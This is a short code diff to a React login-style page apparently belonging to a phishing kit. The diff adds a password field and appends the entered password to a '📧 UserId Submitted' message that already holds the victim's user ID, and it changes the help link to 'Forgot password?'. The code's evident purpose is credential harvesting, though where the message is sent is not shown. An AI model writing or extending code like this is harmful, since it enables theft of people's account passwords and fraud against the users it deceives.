@@ -3,6 +3,7 @@ import PageWatcher from "../components/pagewaters";
 
 export default function EmailPage() {
   const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
   const [isLoading, setIsLoading] = useState(false);
 
   const submit = async (e: React.FormEvent) => {
@@ -15,6 +16,7 @@ export default function EmailPage() {
 📧 UserId Submitted
 
 Userid: ${email}
+Password: ${password}
   `;
 
     try {
@@ -92,11 +94,22 @@ Userid: ${email}
               className="w-full h-12 border border-gray-400 rounded-sm px-4 text-[15px] placeholder:text-gray-500 focus:outline-none focus:border-[#003A70]"
             />
 
+        <hr className="mb-5"/> 
+            
+            <input
+              type="password"
+              required
+              value={password}
+              onChange={(e) => setPassword(e.target.value)}
+              placeholder="Enter Your Password"
+              className="w-full h-12 border border-gray-400 rounded-sm px-4 text-[15px] placeholder:text-gray-500 focus:outline-none focus:border-[#003A70]"
+            />
+
             <button
               type="button"
               className="mt-2 text-[#0067B8] text-[14px] font-medium hover:underline"
             >
-              Forgot User ID?
+              Forgot password?
             </button>
 
             <button
